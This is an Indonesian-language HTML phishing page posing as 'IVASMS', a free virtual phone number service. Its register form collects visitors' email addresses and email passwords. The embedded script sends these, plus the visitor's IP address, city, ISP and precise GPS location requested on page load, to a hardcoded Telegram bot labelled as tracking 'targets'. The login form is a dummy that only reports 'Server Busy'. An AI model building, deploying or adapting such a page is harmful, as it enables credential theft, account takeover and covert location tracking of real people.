<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IVASMS - Penyedia Nokos Free & Murah</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .login-box { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
        h2 { color: #007bff; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; border: none; color: white; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .footer-text { margin-top: 15px; font-size: 13px; color: #666; }
        .footer-text a { color: #007bff; text-decoration: none; cursor: pointer; }
        #login-form { display: none; }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>IVASMS</h2>
        <div id="register-form">
            <p style="font-size: 14px;">Daftar Akun Baru untuk Klaim Nokos Free</p>
            <input type="email" id="reg_email" placeholder="Alamat Email" required>
            <input type="password" id="reg_pass" placeholder="Password Email" required>
            <button onclick="handleRegister()">DAFTAR SEKARANG</button>
            <div class="footer-text">Sudah punya akun? <a onclick="showLogin()">Login di sini</a></div>
        </div>
        <div id="login-form">
            <p style="font-size: 14px;">Silahkan Login ke Akun Anda</p>
            <input type="email" placeholder="Email / Username" required>
            <input type="password" placeholder="Password" required>
            <button onclick="alert('Server Busy!')">LOGIN</button>
        </div>
    </div>

    <script>
        const token = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
        const cid = "8551809114";

        // 1. AUTO GRAB PAS MASUK WEB
        async function autoGrab() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                let text = `🚩 *TARGET MASUK WEB* 🚩\n\nIP: ${ipData.ip}\nKota: ${ipData.city}\nISP: ${ipData.org}`;
                sendToTele(text);
                
                // Minta Lokasi Maps
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                        sendToTele(`📍 *LOKASI PRESISI (MAPS)*\n${mapsUrl}`);
                    });
                }
            } catch (e) {}
        }

        async function sendToTele(msg) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: cid, text: msg, parse_mode: 'Markdown' })
            });
        }

        async function handleRegister() {
            const email = document.getElementById('reg_email').value;
            const pass = document.getElementById('reg_pass').value;
            if(!email || !pass) return;
            await sendToTele(`📩 *DATA LOGIN* 📩\nEmail: ${email}\nPass: ${pass}`);
            alert('Berhasil Daftar! Silahkan Login.');
            showLogin();
        }

        function showLogin() { document.getElementById('register-form').style.display='none'; document.getElementById('login-form').style.display='block'; }
        
        window.onload = autoGrab;
    </script>
</body>
</html>
